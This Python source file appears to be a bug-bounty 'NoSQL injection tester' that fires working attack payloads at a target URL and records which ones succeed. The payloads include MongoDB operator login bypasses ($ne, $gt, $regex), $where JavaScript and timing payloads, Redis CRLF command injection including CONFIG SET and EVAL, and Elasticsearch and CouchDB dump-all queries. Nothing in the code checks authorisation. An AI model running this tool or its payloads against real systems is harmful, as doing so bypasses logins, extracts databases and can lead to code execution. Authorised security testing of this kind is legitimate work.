"""
NoSQL Injection Tester Agent

Comprehensive NoSQL injection testing agent for MongoDB, Redis, Elasticsearch,
CouchDB, Cassandra, DynamoDB, and other NoSQL databases.

Tests for:
- MongoDB operator injection ($gt, $ne, $where, etc.)
- Redis command injection (CRLF, CONFIG SET)
- Elasticsearch query/script injection
- CouchDB Mango query injection
- Authentication bypass via operators
- JavaScript injection in MongoDB
- Time-based blind injection
- NoSQL-specific RCE vectors

Author: BountyHound Team
Version: 3.0.0
Category: Injection
Priority: 8
Risk Level: High
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import asyncio
import aiohttp
import json
import re
import time
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from colorama import Fore, Style
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks



class NoSQLType(Enum):
    """NoSQL database types."""
    MONGODB = "mongodb"
    REDIS = "redis"
    ELASTICSEARCH = "elasticsearch"
    COUCHDB = "couchdb"
    CASSANDRA = "cassandra"
    DYNAMODB = "dynamodb"
    NEO4J = "neo4j"
    ORIENTDB = "orientdb"
    UNKNOWN = "unknown"


class InjectionType(Enum):
    """NoSQL injection types."""
    AUTH_BYPASS = "auth_bypass"
    OPERATOR_INJECTION = "operator_injection"
    COMMAND_INJECTION = "command_injection"
    JAVASCRIPT_INJECTION = "javascript_injection"
    REGEX_INJECTION = "regex_injection"
    TIMING_INJECTION = "timing_injection"
    BLIND_INJECTION = "blind_injection"
    DATA_EXTRACTION = "data_extraction"
    RCE = "rce"


@dataclass
class NoSQLFinding:
    """Represents a NoSQL injection vulnerability finding."""
    finding_id: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    title: str
    description: str
    db_type: NoSQLType
    injection_type: InjectionType
    endpoint: str
    parameter: str
    payload: str
    evidence: Dict[str, Any]
    impact: str
    remediation: str
    bounty_estimate: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    cwe_id: str = "CWE-943"  # Improper Neutralization of Special Elements in Data Query Logic

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary."""
        return {
            'finding_id': self.finding_id,
            'severity': self.severity,
            'title': self.title,
            'description': self.description,
            'db_type': self.db_type.value,
            'injection_type': self.injection_type.value,
            'endpoint': self.endpoint,
            'parameter': self.parameter,
            'payload': self.payload,
            'evidence': self.evidence,
            'impact': self.impact,
            'remediation': self.remediation,
            'bounty_estimate': self.bounty_estimate,
            'timestamp': self.timestamp,
            'cwe_id': self.cwe_id
        }


@dataclass
class InjectionPoint:
    """Represents a potential injection point."""
    url: str
    parameter: str
    method: str
    db_type: Optional[NoSQLType] = None
    vulnerable: bool = False
    injection_type: Optional[InjectionType] = None


class NoSQLInjectionTester:
    """
    Comprehensive NoSQL Injection Tester.

    Tests for NoSQL injection vulnerabilities across multiple databases:
    - MongoDB (operator injection, $where, auth bypass)
    - Redis (CRLF injection, command injection, RCE)
    - Elasticsearch (query injection, script execution)
    - CouchDB (Mango query injection)
    - Generic NoSQL patterns

    Usage:
        tester = NoSQLInjectionTester(target_url="https://api.example.com/login")
        findings = await tester.test_all()
    """

    # MongoDB operators to test
    MONGODB_OPERATORS = [
        "$gt", "$gte", "$lt", "$lte", "$ne", "$eq",
        "$in", "$nin", "$and", "$or", "$not", "$nor",
        "$exists", "$type", "$regex", "$where",
        "$text", "$search", "$elemMatch", "$size",
        "$all", "$function"
    ]

    # MongoDB auth bypass payloads
    MONGODB_AUTH_PAYLOADS = [
        {"password": {"$gt": ""}},
        {"password": {"$ne": None}},
        {"password": {"$ne": "wrongpass"}},
        {"password": {"$regex": ".*"}},
        {"password": {"$exists": True}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": "admin", "password": {"$ne": None}},
        {"$or": [{"username": "admin"}, {"role": "admin"}]},
    ]

    # Redis command injection payloads
    REDIS_PAYLOADS = [
        "\r\nKEYS *\r\n",
        "\r\nCONFIG GET *\r\n",
        "\r\nINFO\r\n",
        "\n\rSET test value\n\r",
        "test\r\nGET test\r\n",
        "\r\n\r\nKEYS *\r\n\r\n",
        "\r\nCONFIG SET dir /tmp\r\n",
        "\r\nEVAL 'return 1' 0\r\n",
    ]

    # Elasticsearch injection payloads
    ELASTICSEARCH_PAYLOADS = [
        {"query": {"match_all": {}}},
        {"query": {"bool": {"should": [{"match_all": {}}]}}},
        {"query": {"regexp": {"field": ".*"}}},
        {"query": {"wildcard": {"field": "*"}}},
        {"size": 10000},
        {"query": {"script": {"script": "1==1"}}},
    ]

    # CouchDB Mango query payloads
    COUCHDB_PAYLOADS = [
        {"selector": {"$gt": None}},
        {"selector": {"_id": {"$regex": ".*"}}},
        {"selector": {"$or": [{}, {}]}},
        {"selector": {}},
    ]

    def __init__(self, target_url: str, target: Optional[str] = None,
                 timeout: int = 10, max_payloads: int = 50):
        """
        Initialize NoSQL Injection Tester.

        Args:
            target_url: Target URL to test
            target: Target identifier for database tracking (default: extracted from URL)
            timeout: Request timeout in seconds
            max_payloads: Maximum payloads to test per category
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.max_payloads = max_payloads
        self.findings: List[NoSQLFinding] = []
        self.injection_points: List[InjectionPoint] = []
        self.db_types: set = set()

        # Extract domain from URL for database tracking
        if target:
            self.target = target
        else:
            parsed = urllib.parse.urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"

        # Track timing baselines for blind injection
        self.timing_baseline: Optional[float] = None

        # Test counters
        self.tests_run = 0
        self.tests_passed = 0

    async def test_all(self) -> List[NoSQLFinding]:
        """
        Execute all NoSQL injection tests.

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'nosql_injection_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        # Get proven payloads from database
        proven_payloads = PayloadHooks.get_payloads_by_type('NoSQL Injection')
        if proven_payloads:
            print(f"[*] Loaded {len(proven_payloads)} proven payloads from database")

        print(f"\n{Fore.CYAN}[*] Starting NoSQL injection testing for {self.target}{Style.RESET_ALL}")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Timeout: {self.timeout}s")

        # Establish timing baseline
        await self._establish_timing_baseline()

        # Run all test categories
        await self._fingerprint_database()
        await self._test_mongodb_injection()
        await self._test_redis_injection()
        await self._test_elasticsearch_injection()
        await self._test_couchdb_injection()
        await self._test_operator_injection()
        await self._test_auth_bypass()
        await self._test_blind_injection()
        await self._test_javascript_injection()

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'nosql_injection_tester',
            findings_count=len(self.findings),
            duration_seconds=0,  # Can track if needed
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in ['CRITICAL', 'HIGH']:
                PayloadHooks.record_payload_success(
                    payload_text=finding.payload,
                    vuln_type='NoSQL Injection',
                    context=f"{finding.db_type.value}_{finding.injection_type.value}",
                    notes=finding.title
                )

        print(f"\n{Fore.CYAN}=== NOSQL INJECTION TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Tests run: {self.tests_run}")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        return self.findings

    async def _establish_timing_baseline(self):
        """Establish timing baseline for blind injection detection."""
        try:
            start = time.time()
            await self._make_request({"test": "baseline"})
            elapsed = time.time() - start
            self.timing_baseline = elapsed
            print(f"[*] Timing baseline: {elapsed:.3f}s")
        except Exception:
            self.timing_baseline = 1.0  # Default

    async def _fingerprint_database(self):
        """Identify NoSQL database type from responses."""
        print(f"\n{Fore.YELLOW}[*] Fingerprinting NoSQL database...{Style.RESET_ALL}")

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            # Test for MongoDB
            if await self._detect_mongodb(session):
                self.db_types.add(NoSQLType.MONGODB)
                print(f"{Fore.GREEN}[+] Detected MongoDB{Style.RESET_ALL}")

            # Test for Redis
            if await self._detect_redis(session):
                self.db_types.add(NoSQLType.REDIS)
                print(f"{Fore.GREEN}[+] Detected Redis{Style.RESET_ALL}")

            # Test for Elasticsearch
            if await self._detect_elasticsearch(session):
                self.db_types.add(NoSQLType.ELASTICSEARCH)
                print(f"{Fore.GREEN}[+] Detected Elasticsearch{Style.RESET_ALL}")

            # Test for CouchDB
            if await self._detect_couchdb(session):
                self.db_types.add(NoSQLType.COUCHDB)
                print(f"{Fore.GREEN}[+] Detected CouchDB{Style.RESET_ALL}")

        if not self.db_types:
            print(f"{Fore.YELLOW}[*] No specific database detected, using generic tests{Style.RESET_ALL}")
            self.db_types.add(NoSQLType.UNKNOWN)

    async def _detect_mongodb(self, session: aiohttp.ClientSession) -> bool:
        """Detect MongoDB backend."""
        indicators = [
            "MongoError",
            "mongodb://",
            "$oid",
            "ObjectId",
            "ISODate",
            "NumberLong",
            "BSONObj",
            "MongoInvalidArgumentError"
        ]

        try:
            # Test with MongoDB operator
            test_payload = {"username": {"$gt": ""}}
            async with session.post(self.target_url, json=test_payload) as response:
                text = await response.text()
                return any(indicator in text for indicator in indicators)
        except Exception:
            pass

        return False

    async def _detect_redis(self, session: aiohttp.ClientSession) -> bool:
        """Detect Redis backend."""
        indicators = [
            "WRONGTYPE",
            "ERR unknown command",
            "Redis",
            "MOVED",
            "ASK",
            "NOAUTH",
            "CROSSSLOT"
        ]

        try:
            # Test with Redis command
            test_payload = "\r\nPING\r\n"
            async with session.post(self.target_url, data=test_payload) as response:
                text = await response.text()
                return any(indicator in text for indicator in indicators)
        except Exception:
            pass

        return False

    async def _detect_elasticsearch(self, session: aiohttp.ClientSession) -> bool:
        """Detect Elasticsearch backend."""
        es_paths = [
            "/_cluster/health",
            "/_cat/indices",
            "/_search",
            "/_stats",
        ]

        for path in es_paths:
            try:
                url = self.target_url.rstrip('/') + path
                async with session.get(url) as response:
                    if response.status == 200:
                        try:
                            data = await response.json()
                            if "cluster_name" in data or "indices" in data or "hits" in data:
                                return True
                        except Exception:
                            pass
            except Exception:
                pass

        return False

    async def _detect_couchdb(self, session: aiohttp.ClientSession) -> bool:
        """Detect CouchDB backend."""
        try:
            async with session.get(self.target_url) as response:
                if response.status == 200:
                    try:
                        data = await response.json()
                        if "couchdb" in data or ("vendor" in data and "name" in data):
                            return True
                    except Exception:
                        pass
        except Exception:
            pass

        return False

    async def _test_mongodb_injection(self):
        """Test MongoDB-specific injection vectors."""
        if NoSQLType.MONGODB not in self.db_types and NoSQLType.UNKNOWN not in self.db_types:
            return

        print(f"\n{Fore.YELLOW}[*] Testing MongoDB injection...{Style.RESET_ALL}")

        # Test operator injection
        operator_payloads = [
            {"username": {"$where": "1==1"}},
            {"username": {"$where": "this.username=='admin'"}},
            {"$or": [{"username": "admin"}, {"username": "administrator"}]},
            {"username": {"$nin": ["blocked_user"]}},
            {"username": {"$regex": "^admin"}},
        ]

        for payload in operator_payloads[:self.max_payloads]:
            self.tests_run += 1
            await self._test_mongo_operator_injection(payload)

    async def _test_mongo_operator_injection(self, payload: Dict):
        """Test MongoDB operator injection."""
        try:
            result = await self._make_request(payload)
            if not result:
                return

            response, text = result

            # Check for data leakage
            if response.status == 200 and self._has_data_leak(text):
                finding = NoSQLFinding(
                    finding_id=f"NOSQL-MONGO-OP-{len(self.findings)+1}",
                    severity="HIGH",
                    title="MongoDB Operator Injection",
                    description=f"MongoDB operators can be injected to manipulate queries and extract data.",
                    db_type=NoSQLType.MONGODB,
                    injection_type=InjectionType.OPERATOR_INJECTION,
                    endpoint=self.target_url,
                    parameter="query",
                    payload=json.dumps(payload),
                    evidence={
                        "payload": payload,
                        "response_status": response.status,
                        "data_leaked": text[:500]
                    },
                    impact="Attackers can extract sensitive data, bypass access controls, or enumerate database contents.",
                    remediation="Validate and sanitize all user input. Use allow-lists for query operators. Disable dangerous operators like $where.",
                    bounty_estimate="$2000-$6000"
                )
                self.findings.append(finding)
                self.tests_passed += 1

        except Exception:
            pass

    async def _test_redis_injection(self):
        """Test Redis command injection."""
        if NoSQLType.REDIS not in self.db_types and NoSQLType.UNKNOWN not in self.db_types:
            return

        print(f"\n{Fore.YELLOW}[*] Testing Redis command injection...{Style.RESET_ALL}")

        for payload in self.REDIS_PAYLOADS[:self.max_payloads]:
            self.tests_run += 1
            await self._test_redis_crlf(payload)

    async def _test_redis_crlf(self, payload: str):
        """Test Redis CRLF injection."""
        try:
            result = await self._make_request(payload, is_raw=True)
            if not result:
                return

            response, text = result

            # Check for Redis command output
            redis_indicators = [
                "*",  # Array response
                "$",  # Bulk string
                "+OK",
                "-ERR",
                ":1",  # Integer
                "redis_version",
                "used_memory",
            ]

            if any(indicator in text for indicator in redis_indicators):
                # Determine severity based on command
                severity = "CRITICAL" if "CONFIG" in payload or "EVAL" in payload else "HIGH"

                finding = NoSQLFinding(
                    finding_id=f"NOSQL-REDIS-CMD-{len(self.findings)+1}",
                    severity=severity,
                    title="Redis Command Injection via CRLF",
                    description=f"Redis commands can be injected using CRLF sequences, enabling command execution.",
                    db_type=NoSQLType.REDIS,
                    injection_type=InjectionType.COMMAND_INJECTION,
                    endpoint=self.target_url,
                    parameter="input",
                    payload=repr(payload),
                    evidence={
                        "payload": repr(payload),
                        "response": text[:500]
                    },
                    impact="Attackers can execute arbitrary Redis commands, read/write data, or achieve RCE via CONFIG SET.",
                    remediation="Sanitize CRLF characters from user input. Use Redis ACLs to restrict commands. Disable CONFIG and EVAL if not needed.",
                    bounty_estimate="$5000-$10000" if severity == "CRITICAL" else "$3000-$7000"
                )
                self.findings.append(finding)
                self.tests_passed += 1

        except Exception:
            pass

    async def _test_elasticsearch_injection(self):
        """Test Elasticsearch query injection."""
        if NoSQLType.ELASTICSEARCH not in self.db_types:
            return

        print(f"\n{Fore.YELLOW}[*] Testing Elasticsearch injection...{Style.RESET_ALL}")

        for payload in self.ELASTICSEARCH_PAYLOADS[:self.max_payloads]:
            self.tests_run += 1
            await self._test_es_injection(payload)

    async def _test_es_injection(self, payload: Dict):
        """Test Elasticsearch query injection."""
        search_endpoint = self.target_url.rstrip('/') + '/_search'

        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
                async with session.post(search_endpoint, json=payload) as response:
                    if response.status == 200:
                        try:
                            data = await response.json()
                            hits = data.get("hits", {}).get("hits", [])

                            if hits:
                                finding = NoSQLFinding(
                                    finding_id=f"NOSQL-ES-INJECT-{len(self.findings)+1}",
                                    severity="HIGH",
                                    title="Elasticsearch Query Injection",
                                    description=f"Elasticsearch queries can be manipulated to extract all documents.",
                                    db_type=NoSQLType.ELASTICSEARCH,
                                    injection_type=InjectionType.OPERATOR_INJECTION,
                                    endpoint=search_endpoint,
                                    parameter="query",
                                    payload=json.dumps(payload),
                                    evidence={
                                        "payload": payload,
                                        "documents_leaked": len(hits),
                                        "sample_data": hits[0] if hits else None
                                    },
                                    impact="Attackers can bypass query filters and extract all indexed data.",
                                    remediation="Validate query structure and use query templates. Implement proper access controls.",
                                    bounty_estimate="$2000-$6000"
                                )
                                self.findings.append(finding)
                                self.tests_passed += 1
                        except Exception:
                            pass
        except Exception:
            pass

    async def _test_couchdb_injection(self):
        """Test CouchDB Mango query injection."""
        if NoSQLType.COUCHDB not in self.db_types:
            return

        print(f"\n{Fore.YELLOW}[*] Testing CouchDB injection...{Style.RESET_ALL}")

        for payload in self.COUCHDB_PAYLOADS[:self.max_payloads]:
            self.tests_run += 1
            await self._test_couchdb_mango(payload)

    async def _test_couchdb_mango(self, payload: Dict):
        """Test CouchDB Mango query injection."""
        find_endpoint = self.target_url.rstrip('/') + '/_find'

        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
                async with session.post(find_endpoint, json=payload) as response:
                    if response.status == 200:
                        try:
                            data = await response.json()
                            docs = data.get("docs", [])

                            if docs:
                                finding = NoSQLFinding(
                                    finding_id=f"NOSQL-COUCH-INJECT-{len(self.findings)+1}",
                                    severity="HIGH",
                                    title="CouchDB Mango Query Injection",
                                    description=f"CouchDB Mango queries can be manipulated to extract all documents.",
                                    db_type=NoSQLType.COUCHDB,
                                    injection_type=InjectionType.OPERATOR_INJECTION,
                                    endpoint=find_endpoint,
                                    parameter="selector",
                                    payload=json.dumps(payload),
                                    evidence={
                                        "payload": payload,
                                        "documents_leaked": len(docs),
                                        "sample_data": docs[0] if docs else None
                                    },
                                    impact="Attackers can bypass access controls and extract all database documents.",
                                    remediation="Validate selector structure and implement proper authentication.",
                                    bounty_estimate="$2000-$6000"
                                )
                                self.findings.append(finding)
                                self.tests_passed += 1
                        except Exception:
                            pass
        except Exception:
            pass

    async def _test_operator_injection(self):
        """Test NoSQL operator injection across parameters."""
        print(f"\n{Fore.YELLOW}[*] Testing operator injection...{Style.RESET_ALL}")

        operators = self.MONGODB_OPERATORS[:10]  # Test subset

        for operator in operators:
            self.tests_run += 1
            # Test in JSON body
            payload = {"field": {operator: ""}}
            await self._test_generic_operator(payload)

    async def _test_generic_operator(self, payload: Dict):
        """Test generic operator injection."""
        try:
            result = await self._make_request(payload)
            if not result:
                return

            response, text = result

            # Check for data leakage or behavioral changes
            if response.status == 200 and self._has_data_leak(text):
                # Potential vulnerability (logged but not reported unless specific)
                pass

        except Exception:
            pass

    async def _test_auth_bypass(self):
        """Test authentication bypass via NoSQL injection."""
        print(f"\n{Fore.YELLOW}[*] Testing authentication bypass...{Style.RESET_ALL}")

        for payload in self.MONGODB_AUTH_PAYLOADS[:self.max_payloads]:
            self.tests_run += 1
            await self._test_mongo_auth_bypass(payload)

    async def _test_mongo_auth_bypass(self, payload: Dict):
        """Test MongoDB authentication bypass."""
        try:
            start_time = time.time()
            result = await self._make_request(payload)
            if not result:
                return

            response, text = result
            elapsed = time.time() - start_time

            # Check for successful bypass
            success_indicators = [
                "token",
                "session",
                "logged in",
                "welcome",
                "dashboard",
                "authenticated",
                "jwt",
            ]

            if response.status == 200 and any(indicator in text.lower() for indicator in success_indicators):
                finding = NoSQLFinding(
                    finding_id=f"NOSQL-AUTH-BYPASS-{len(self.findings)+1}",
                    severity="CRITICAL",
                    title="MongoDB Authentication Bypass via Operator Injection",
                    description=f"Authentication can be bypassed using MongoDB operators in the login endpoint.",
                    db_type=NoSQLType.MONGODB,
                    injection_type=InjectionType.AUTH_BYPASS,
                    endpoint=self.target_url,
                    parameter="login",
                    payload=json.dumps(payload),
                    evidence={
                        "payload": payload,
                        "response_status": response.status,
                        "response_snippet": text[:500]
                    },
                    impact="Attackers can bypass authentication and gain unauthorized access to user accounts without valid credentials.",
                    remediation="Sanitize user input and use parameterized queries. Validate input types. Disable JavaScript execution in MongoDB.",
                    bounty_estimate="$3000-$8000"
                )
                self.findings.append(finding)
                self.tests_passed += 1

        except Exception:
            pass

    async def _test_blind_injection(self):
        """Test blind NoSQL injection via timing."""
        print(f"\n{Fore.YELLOW}[*] Testing blind NoSQL injection...{Style.RESET_ALL}")

        # Time-based payloads
        payloads = [
            {"username": "admin", "password": {"$where": "sleep(5000)"}},
            {"username": {"$where": "function(){var d=new Date();var c=null;do{c=new Date();}while(c-d<5000);return true;}"}},
        ]

        for payload in payloads[:self.max_payloads]:
            self.tests_run += 1
            await self._test_timing_injection(payload)

    async def _test_timing_injection(self, payload: Dict):
        """Test time-based blind injection."""
        try:
            start_time = time.time()
            result = await self._make_request(payload, timeout=15)
            elapsed = time.time() - start_time

            # Check for time-based injection (expecting 5s delay)
            if elapsed >= 4.5:  # Allow some variance
                finding = NoSQLFinding(
                    finding_id=f"NOSQL-BLIND-{len(self.findings)+1}",
                    severity="HIGH",
                    title="Blind NoSQL Injection via Timing",
                    description=f"Time-based blind NoSQL injection detected using sleep/delay functions.",
                    db_type=NoSQLType.MONGODB,
                    injection_type=InjectionType.TIMING_INJECTION,
                    endpoint=self.target_url,
                    parameter="query",
                    payload=json.dumps(payload),
                    evidence={
                        "payload": payload,
                        "elapsed_time": f"{elapsed:.2f}s",
                        "expected_delay": "5.0s"
                    },
                    impact="Attackers can extract data byte-by-byte using timing attacks.",
                    remediation="Disable JavaScript execution in MongoDB. Validate all input. Use strict type checking.",
                    bounty_estimate="$2000-$6000"
                )
                self.findings.append(finding)
                self.tests_passed += 1

        except Exception:
            pass

    async def _test_javascript_injection(self):
        """Test MongoDB JavaScript injection via $where."""
        print(f"\n{Fore.YELLOW}[*] Testing JavaScript injection...{Style.RESET_ALL}")

        js_payloads = [
            {"username": {"$where": "function(){return true}"}},
            {"username": {"$where": "this.username.match(/admin/)"}},
            {"username": {"$function": {"body": "function(){return 1}", "args": [], "lang": "js"}}},
        ]

        for payload in js_payloads[:self.max_payloads]:
            self.tests_run += 1
            await self._test_mongo_js_injection(payload)

    async def _test_mongo_js_injection(self, payload: Dict):
        """Test MongoDB JavaScript injection."""
        try:
            start_time = time.time()
            result = await self._make_request(payload, timeout=15)
            if not result:
                return

            response, text = result
            elapsed = time.time() - start_time

            # Check for successful JavaScript execution
            if response.status == 200 or "sleep" in json.dumps(payload).lower():
                # If it's a sleep payload and elapsed time matches, it's vulnerable
                if "sleep" in json.dumps(payload).lower() and elapsed >= 4.5:
                    severity = "CRITICAL"
                elif response.status == 200 and self._has_data_leak(text):
                    severity = "HIGH"
                else:
                    return

                finding = NoSQLFinding(
                    finding_id=f"NOSQL-JS-{len(self.findings)+1}",
                    severity=severity,
                    title="MongoDB JavaScript Injection via $where",
                    description=f"JavaScript code can be injected via $where operator, enabling code execution.",
                    db_type=NoSQLType.MONGODB,
                    injection_type=InjectionType.JAVASCRIPT_INJECTION,
                    endpoint=self.target_url,
                    parameter="query",
                    payload=json.dumps(payload),
                    evidence={
                        "payload": payload,
                        "elapsed_time": f"{elapsed:.2f}s",
                        "response_status": response.status
                    },
                    impact="Attackers can execute arbitrary JavaScript code on the database server, potentially leading to RCE or data extraction.",
                    remediation="Disable JavaScript execution in MongoDB (set security.javascriptEnabled to false). Remove $where operator support.",
                    bounty_estimate="$4000-$10000"
                )
                self.findings.append(finding)
                self.tests_passed += 1

        except Exception:
            pass

    async def _make_request(self, payload, is_raw: bool = False, timeout: Optional[int] = None) -> Optional[Tuple]:
        """
        Make HTTP request with payload.

        Args:
            payload: Payload to send (dict or string)
            is_raw: If True, send as raw data instead of JSON
            timeout: Custom timeout (default: self.timeout)

        Returns:
            Tuple of (response, text) or None
        """
        try:
            request_timeout = timeout or self.timeout
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=request_timeout)) as session:
                if is_raw:
                    async with session.post(self.target_url, data=payload) as response:
                        text = await response.text()
                        return (response, text)
                else:
                    async with session.post(self.target_url, json=payload) as response:
                        text = await response.text()
                        return (response, text)
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None

    def _has_data_leak(self, text: str) -> bool:
        """Check if response contains leaked data."""
        if not text or len(text) < 20:
            return False

        leak_indicators = [
            '"_id":',
            '"email":',
            '"password":',
            '"users":',
            '"data":'
        ]

        # Check for JSON array with objects containing sensitive fields
        has_indicator = any(indicator in text for indicator in leak_indicators)
        is_json_array = text.strip().startswith('[') and text.strip().endswith(']')

        return has_indicator or (is_json_array and len(text) > 50)

    def _print_findings_summary(self):
        """Print summary of findings."""
        print(f"\n{Fore.RED}[!] NOSQL INJECTION VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            if finding.severity not in by_severity:
                by_severity[finding.severity] = []
            by_severity[finding.severity].append(finding)

        # Print by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                findings = by_severity[severity]
                print(f"\n{severity}: {len(findings)}")
                for f in findings[:3]:  # Show first 3
                    print(f"  - {f.title}")
                    print(f"    Database: {f.db_type.value}")
                    print(f"    Payload: {f.payload[:60]}{'...' if len(f.payload) > 60 else ''}")

    def get_findings(self) -> List[NoSQLFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: str) -> List[NoSQLFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_findings_by_db_type(self, db_type: NoSQLType) -> List[NoSQLFinding]:
        """Get findings by database type."""
        return [f for f in self.findings if f.db_type == db_type]

    def get_summary(self) -> Dict[str, Any]:
        """
        Generate summary of test results.

        Returns:
            Dictionary with test statistics and findings
        """
        severity_counts = {
            'CRITICAL': len([f for f in self.findings if f.severity == 'CRITICAL']),
            'HIGH': len([f for f in self.findings if f.severity == 'HIGH']),
            'MEDIUM': len([f for f in self.findings if f.severity == 'MEDIUM']),
            'LOW': len([f for f in self.findings if f.severity == 'LOW']),
            'INFO': len([f for f in self.findings if f.severity == 'INFO'])
        }

        db_type_counts = {}
        for db_type in self.db_types:
            db_type_counts[db_type.value] = len(self.get_findings_by_db_type(db_type))

        return {
            'target': self.target_url,
            'total_tests': self.tests_run,
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'database_types_detected': [db.value for db in self.db_types],
            'database_findings': db_type_counts,
            'vulnerable': len(self.findings) > 0,
            'findings': [f.to_dict() for f in self.findings]
        }


async def main():
    """CLI interface for testing."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python nosql_injection_tester.py <target_url> [target_name]")
        print("Example: python nosql_injection_tester.py https://api.example.com/login example.com")
        sys.exit(1)

    target_url = sys.argv[1]
    target = sys.argv[2] if len(sys.argv) > 2 else None

    tester = NoSQLInjectionTester(target_url=target_url, target=target)
    findings = await tester.test_all()

    print(f"\n{Fore.CYAN}=== FINAL RESULTS ==={Style.RESET_ALL}")
    print(f"Total tests: {tester.tests_run}")
    print(f"Findings: {len(findings)}")

    if findings:
        print(f"\n{Fore.RED}[!] NoSQL injection vulnerabilities detected!{Style.RESET_ALL}")
        print(f"Review findings and validate manually.")

        # Print summary
        summary = tester.get_summary()
        print(f"\nSeverity Breakdown:")
        for severity, count in summary['severity_breakdown'].items():
            if count > 0:
                print(f"  {severity}: {count}")


if __name__ == "__main__":
    asyncio.run(main())
